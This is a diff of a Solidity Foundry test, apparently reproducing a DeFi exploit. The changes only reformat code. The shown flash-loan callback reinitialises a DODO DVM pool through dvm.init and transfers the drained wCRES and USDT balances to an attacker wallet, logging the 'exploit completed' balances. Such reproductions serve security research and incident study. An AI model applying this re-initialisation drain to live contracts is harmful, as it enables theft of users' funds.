@@ -8,7 +8,9 @@ import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
 
 import {IUSDT} from "src/interfaces/IUSDT.sol";
 import {IDVM} from "src/interfaces/IDVM.sol";
+
 contract ContractTest is Test {
+
     uint256 wCRES_amount = 130_000_000_000_000_000_000_000;
 
     uint256 usdt_amount = 1_100_000_000_000;
@@ -38,41 +40,19 @@ contract ContractTest is Test {
         //emit log_named_uint("Exploit completed, WBNB Balance",wbnb.balanceOf(mywallet));
     }
 
-    function DVMFlashLoanCall(
-        address a,
-        uint256 b,
-        uint256 c,
-        bytes memory d
-    ) public {
+    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public {
         a;
         b;
         c;
         d;
-        emit log_named_uint(
-            "FlashLoan WBNB Balance",
-            wCRES_token.balanceOf(address(this))
-        );
-        dvm.init(
-            maintainer,
-            token1,
-            token2,
-            lpFeeRate,
-            mtFeeRateModel,
-            i,
-            k,
-            isOpenTWAP
-        );
+        emit log_named_uint("FlashLoan WBNB Balance", wCRES_token.balanceOf(address(this)));
+        dvm.init(maintainer, token1, token2, lpFeeRate, mtFeeRateModel, i, k, isOpenTWAP);
         wCRES_token.transfer(mywallet, wCRES_token.balanceOf(address(this)));
         usdt_token.transfer(mywallet, usdt_token.balanceOf(address(this)));
 
-        emit log_named_uint(
-            "After Exploit completed, wCRES Balance",
-            wCRES_token.balanceOf(mywallet)
-        );
+        emit log_named_uint("After Exploit completed, wCRES Balance", wCRES_token.balanceOf(mywallet));
         usdt_token.transfer(mywallet, usdt_token.balanceOf(address(this)));
-        emit log_named_uint(
-            "After Exploit completed, IUSDT Balance",
-            usdt_token.balanceOf(mywallet)
-        );
+        emit log_named_uint("After Exploit completed, IUSDT Balance", usdt_token.balanceOf(mywallet));
     }
+
 }
